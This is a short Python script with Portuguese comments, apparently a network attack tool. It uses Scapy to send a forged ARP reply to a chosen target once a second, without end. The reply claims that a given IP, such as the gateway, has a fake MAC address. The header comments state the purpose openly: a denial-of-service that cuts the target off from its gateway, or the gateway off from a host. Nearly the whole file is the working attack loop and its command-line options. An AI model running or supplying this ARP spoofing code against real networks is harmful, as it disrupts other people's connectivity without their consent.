#!/usr/bin/python
#
# Descricao: A funcionalidade basica desse software eh enviar 
# continuamente pacotes ARP para um determinado alvo (pode ser em broadcast tambem).
# A vantagem eh que se pode, por exemplo, configurar para o software enviar os
# pacotes ARP dizendo que o endereco MAC do gateway eh um MAC que nao existe.
# Assim, quando o alvo for enviar qualquer pacote para o gateway, ele ira enviar
# para o MAC que nao existe ocasionando assim um ataque de DoS.
# Outra coisa que se pode fazer eh enviar pacotes para o gateway dizendo que o MAC
# de determinado host (IP) eh un MAC que nao existe, assim sera o gateway que nao
# achara o host
#
#
#
# Daniel Tomm
# Gabriel Richter
#
# Data Criacao: 16-09-2015 
# Data Modificacao: 13-10-2015
#

# Importar bibliotecas e afins
from scapy.all import *
from os import system
import argparse
import sys
import logging
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Funcao para capturar os argumentos
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Choose the target IP. Example: -t 192.168.0.100")
    parser.add_argument("-i", "--changeip", help="Choose the destination IP. Example: -g 192.168.0.1")
    parser.add_argument("-m", "--changemac", help="False destination MAC address")
    parser.add_argument("-v", "--version", action="version", version="%(prog)s 2.0")
    return parser.parse_args()


# Funcao principal
def main(args):

    # Inicializando contador
    contador = 0

    # Se nao e root fecha
    if os.geteuid() != 0:
	sys.exit ("Run as root. Closing...")

    # Atribui parametros as variaveis
    ipvitima = args.target
    ipdestino = args.changeip
    changemac = args.changemac

    # Verifica parametros informados
    if ipvitima == None:
        sys.exit("Check the help menu -h --help")
    if ipdestino == None:
        sys.exit("Check the help menu -h --help")
    if changemac == None:
        sys.exit("Check the help menu -h --help")

    # Envia pacote arp eternamente
    while 1:
	# Limpar a tela
	system("clear")

	# Envia pacote ARP
        send (ARP(op=2, pdst=ipvitima, psrc=ipdestino, hwsrc=changemac))

	# Incrementa o contador
	contador = (contador + 1)

	# Imprime contador na tela
	print ("Sending ARP packets...")
	print ("Packets sent: ", contador)

	# Aguarda um segundo
	time.sleep(1)

main(parse_args())
